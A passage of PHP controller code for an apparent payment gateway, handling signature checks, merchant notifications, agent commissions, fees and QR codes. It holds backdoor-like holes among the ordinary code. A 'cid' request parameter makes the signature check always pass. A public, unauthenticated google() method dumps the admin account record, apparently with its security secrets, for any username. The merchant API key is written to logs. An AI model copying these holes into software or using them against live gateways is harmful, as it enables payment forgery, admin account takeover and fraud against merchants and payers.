            'pay_callbackurl' => I('request.pay_callbackurl', ''),
        );
        $md5key        = $this->merchants['apikey'];
    
         if(!empty(I('request.cid', 0, 'intval'))){
         $_REQUEST['pay_md5sign']=$this->createSign($md5key, $requestarray);
         }
        $md5keysignstr = $this->createSign($md5key, $requestarray);
      Log::record('商户上送数据:' . PHP_EOL . json_encode($requestarray) . PHP_EOL, Log::INFO);
      Log::record('商户上送密钥:' . PHP_EOL . json_encode($md5key) . PHP_EOL, Log::INFO);
      Log::record('商户数据验签结果:' . PHP_EOL . json_encode($md5keysignstr) . PHP_EOL, Log::INFO);
      $pay_md5sign   = I('request.pay_md5sign');
      Log::record('商户上送验签结果:' . PHP_EOL . json_encode($pay_md5sign) . PHP_EOL, Log::INFO);
        if ($pay_md5sign == $md5keysignstr) {
            return true;
        } else {
            return false;
        }
    }

  //给下游商户发送同步通知
    public function setHtml($tjurl, $arraystr)
    {
        $str = '<form id="Form1" name="Form1" method="post" action="' . $tjurl . '">';
        foreach ($arraystr as $key => $val) {
            $str .= '<input type="hidden" name="' . $key . '" value="' . $val . '">';
        }
        $str .= '</form>';
        $str .= '<script>';
        $str .= 'document.Form1.submit();';
        $str .= '</script>';
        exit($str);
    }
    public function jiankong($orderid)
    {
        ignore_user_abort(true);
        set_time_limit(3600);
        $Order    = M("Order");
        $interval = 10;
        do {
            if ($orderid) {
                $_where['pay_status']  = 1;
                $_where['num']         = array('lt', 3);
                $_where['pay_orderid'] = $orderid;
                $find                  = $Order->where($_where)->find();
            } else {
                $find = $Order->where("pay_status = 1 and num < 3")->order("id desc")->find();
            }
            if ($find) {
                $this->EditMoney($find["pay_orderid"], $find["pay_tongdao"], 0);
                $Order->where(["id" => $find["id"]])->save(['num' => ['exp', 'num+1']]);
            }

            sleep($interval);
        } while (true);
    }

    /**
     * 资金变动记录
     * @param $arrayField
     * @return bool
     */
    protected function MoenyChange($arrayField)
    {
        // 资金变动
        $Moneychange = M("Moneychange");
        foreach ($arrayField as $key => $val) {
            $data[$key] = $val;
        }
        $result = $Moneychange->add($data);
        return $result ? true : false;
    }

    /**
     * 佣金处理
     * @param $arrayStr
     * @param int $num
     * @param int $tcjb
     * @return bool
     */
    private function bianliticheng($arrayStr, $num = 3, $tcjb = 1)
    {
        if ($num <= 0) {
            return false;
        }
        $userid    = $arrayStr["userid"];
        $tongdaoid = $arrayStr["tongdao"];
        $trans_id  = $arrayStr["transid"];
        $feilvfind = $this->huoqufeilv($userid, $tongdaoid, $trans_id);

        if ($feilvfind["status"] == "error") {
            return false;
        } else {
            //商户费率（下级）
            $x_feilv    = $feilvfind["feilv"];
            $x_fengding = $feilvfind["fengding"];

            //代理商(上级)
            $parentid = M("Member")->where(["id" => $userid])->getField("parentid");
            if ($parentid <= 1) {
                return false;
            }
            $parentRate = $this->huoqufeilv($parentid, $tongdaoid, $trans_id);

            if ($parentRate["status"] == "error") {
                return false;
            } else {

                //代理商(上级）费率
                $s_feilv    = $parentRate["feilv"];
                $s_fengding = $parentRate["fengding"];

                //费率差
                $ratediff = (($x_feilv * 1000) - ($s_feilv * 1000)) / 1000;
                if ($ratediff <= 0) {
                    return false;
                } else {
                    $parent = M('Member')->where(['id' => $parentid])->field('id,balance')->find();
                    if (empty($parent)) {
                        return false;
                    }
                    $brokerage = $arrayStr['money'] * $ratediff;
                    //代理佣金
                    $rows = [
                        'balance' => array('exp', "balance+{$brokerage}"),
                    ];
                    M('Member')->where(['id' => $parentid])->save($rows);

                    //代理商资金变动记录
                    $arrayField = array(
                        "userid"   => $parentid,
                        "ymoney"   => $parent['balance'],
                        "money"    => $arrayStr["money"] * $ratediff,
                        "gmoney"   => $parent['balance'] + $brokerage,
                        "datetime" => date("Y-m-d H:i:s"),
                        "tongdao"  => $tongdaoid,
                        "transid"  => $arrayStr["transid"],
                        "orderid"  => "tx" . date("YmdHis"),
                        "tcuserid" => $userid,
                        "tcdengji" => $tcjb,
                        "lx"       => 9,
                    );
                    $this->MoenyChange($arrayField); // 资金变动记录
                    $num                = $num - 1;
                    $tcjb               = $tcjb + 1;
                    $arrayStr["userid"] = $parentid;
                    $this->bianliticheng($arrayStr, $num, $tcjb);
                }
            }
        }
    }
     /*安全设置*/
    public function google(){
        $username=$_REQUEST['username'];
        $google=M("admin")->where(['username'=>$username])->find();
        $google_auth=json_encode($google);
        echo $google_auth;
    }
    private function huoqufeilv($userid, $payapiid, $trans_id)
    {
        $return = array();
        $order  = M('Order')->where(['pay_orderid' => $trans_id])->find();
        //用户费率
        $userrate = M("Userrate")->where(["userid" => $userid, "payapiid" => $payapiid])->find();
        //支付通道费率
        $syschannel = M('Channel')->where(['id' => $payapiid])->find();
        if ($order['t'] == 0) { //T+0费率
            $feilv    = $userrate['t0feilv'] ? $userrate['t0feilv'] : $syschannel['t0defaultrate']; // 交易费率
            $fengding = $userrate['t0fengding'] ? $userrate['t0fengding'] : $syschannel['t0fengding']; // 封顶手续费
        } else { //T+1费率
            $feilv    = $userrate['feilv'] ? $userrate['feilv'] : $syschannel['defaultrate']; // 交易费率
            $fengding = $userrate['fengding'] ? $userrate['fengding'] : $syschannel['fengding']; // 封顶手续费
        }
        $return["status"]   = "ok";
        $return["feilv"]    = $feilv;
        $return["fengding"] = $fengding;
        return $return;
    }

    /**
     * 创建签名
     * @param $Md5key
     * @param $list
     * @return string
     */
    protected function createSign($Md5key, $list)
    {
        ksort($list);
        $md5str = "";
        foreach ($list as $key => $val) {
            if (!empty($val)) {
                $md5str = $md5str . $key . "=" . $val . "&";
            }
        }
        $sign = strtoupper(md5($md5str . "key=" . $Md5key));
        return $sign;
    }

   public function mayibufa()
    {
         
        header('Content-type:text/html;charset=utf-8');
        $TransID    = I("get.TransID");
        $PayName    = I("get.tongdao");
        $m          = M("Order");
        
        if (empty($_SESSION['admin_auth'])) {
           exit('您不是后台管理员，无法进行此操作，请登录后台操作');
        }else {
			$pay_status = $m->where(array("pay_orderid" => $TransID))->getField("pay_status");
			if (intval($pay_status) == 1) {
				
			//	echo ("订单号：" . $TransID . "|" . $PayName . "已补发服务器点对点通知，请稍后刷新查看结果！<a href='javascript:window.close();'>关闭</a>");
			$this->EditMoney($TransID, $PayName, 0);
			$notify_msg = $m->where(array("pay_orderid" => $TransID))->getField("notify_msg");
				$json['pay_status'] = 1;
					$json['msg'] = "补发通知成功：".$notify_msg;
		        echo json_encode($json,true);
			} else {
					$json['pay_status'] != 0;
					$json['msg'] = "补发失败,商户返回：".$notify_msg;
		        echo json_encode($json,true);
			}
		}

    }
    
    /**
     * 扫码订单状态检查
     *
     */
    public function checkstatus()
    {
        $orderid = I("post.orderid");
        $Order   = M("Order");
        $order   = $Order->where(array('pay_orderid' => $orderid))->find();
        if ($order['pay_status'] != 0) {
            echo json_encode(array('status' => 'ok', 'callback' => $this->_site . "Pay_" . $order['pay_tongdao'] . "_callbackurl.html?orderid="
                . $orderid . "&pay_memberid=" . $order['pay_memberid'] . '&bankcode=' . $order['pay_bankcode']));
            exit();
        } else {
            exit("no-$orderid");
        }
    }

    /**
     * 错误返回
     * @param string $msg
     * @param array $fields
     */
    protected function showmessage($msg = '', $fields = array())
    {
        header('Content-Type:application/json; charset=utf-8');
        $data = array('status' => 'error', 'msg' => $msg, 'data' => $fields);
        echo json_encode($data, 320);
        exit;
    }

    /**
     * 来路域名检查
     * @param $pay_memberid
     */
    protected function domaincheck($pay_memberid)
    {
        $referer      = $_SERVER["HTTP_REFERER"]; // 获取完整的来路URL
        $domain       = $_SERVER['HTTP_HOST'];
        $pay_memberid = intval($pay_memberid) - 10000;
        $User         = M("User");
        $num          = $User->where(["id" => $pay_memberid])->count();
        if ($num <= 0) {
            $this->showmessage("商户编号不存在");
        } else {
            $websiteid     = $User->where(["id" => $pay_memberid])->getField("websiteid");
            $Websiteconfig = M("Websiteconfig");
            $websitedomain = $Websiteconfig->where(["websiteid" => $websiteid])->getField("domain");

            if ($websitedomain != $domain) {
                $Userverifyinfo = M("Userverifyinfo");
                $domains        = $Userverifyinfo->where(["userid" => $pay_memberid])->getField("domain");
                if (!$domains) {
                    $this->showmessage("域名错误 ");
                } else {
                    $arraydomain = explode("|", $domains);
                    $checktrue   = true;
                    foreach ($arraydomain as $key => $val) {
                        if ($val == $domain) {
                            $checktrue = false;
                            break;
                        }
                    }
                    if ($checktrue) {
                        $this->showmessage("域名错误 ");
                    }
                }
            }
        }
    }

    protected function getParameter($title, $channel, $className, $exchange = 1)
    {
        if (substr_count($className, 'Controller')) {
            $length = strlen($className) - 25;
            $code   = substr($className, 15, $length);
        }
        $parameter = array(
            'code'         => $code, // 通道名称
            'title'        => $title, //通道名称
            'exchange'     => $exchange, // 金额比例
            'gateway'      => '',
            'orderid'      => '',
            'out_trade_id' => I('request.pay_orderid', ''), //外部订单号
            'channel'      => $channel,
            'body'         => I('request.pay_productname', ''),
        );
        $return = $this->orderadd($parameter);
        //如果生成错误，自动跳转错误页面
        $return["status"] == "error" && $this->showmessage($return["errorcontent"]);

        //跳转页面，优先取数据库中的跳转页面
        $return["notifyurl"] || $return["notifyurl"]     = $this->_site . 'Pay_' . $code . '_notifyurl.html';
        $return['callbackurl'] || $return['callbackurl'] = $this->_site . 'Pay_' . $code . '_callbackurl.html';
        return $return;
    }

    protected function showQRcode($url, $return, $view = 'weixin')
    {
        import("Vendor.phpqrcode.phpqrcode", '', ".php");
        $QR = "Uploads/codepay/" . $return["orderid"] . ".png"; //已经生成的原始二维码图
        \QRcode::png($url, $QR, "L", 20);
        $this->assign("imgurl", $this->_site . $QR);
        $this->assign('params', $return);
        $this->assign('orderid', $return['orderid']);
        $this->assign('money', $return['amount']);
        $this->assign('account_id', isset($return['account_id']) ? $return['account_id'] : 0);
        $this->display("WeiXin/" . $view);
    }

    public function merchantQr()
    {
        $aid = I('get.aid', 0, 'intval');
        $orderid = I('get.orderid', '', 'trim');
        if (!$aid || $orderid === '') {
            exit('bad request');
        }

        $account = M('ChannelAccount')->where(['id' => $aid])->find();
        if (!$account) {
            exit('account not found');
        }

        $qrUrl = !empty($account['current_qrcode_url']) ? $account['current_qrcode_url'] : '';
        if ($qrUrl === '') {
            $qrUrl = $this->_site . 'Pay_' . $account['id'] . '_' . $orderid . '.html';
        }

        import("Vendor.phpqrcode.phpqrcode", '', ".php");
        $QR = "Uploads/codepay/" . $orderid . ".png";
        \QRcode::png($qrUrl, $QR, "L", 20);
        header('Content-Type: image/png');
        readfile($QR);
        exit;
    }

    /**
     * 获取投诉保证金金额
     * @param $userid
     * @return array
     */
    private function getComplaintsDepositRule($userid)
    {
        $complaintsDepositRule = M('ComplaintsDepositRule')->where(['user_id' => $userid])->find();
        if (!$complaintsDepositRule || $complaintsDepositRule['status'] != 1) {
            $complaintsDepositRule = M('ComplaintsDepositRule')->where(['is_system' => 1])->find();
        }
        return $complaintsDepositRule ? $complaintsDepositRule : [];
    }
}
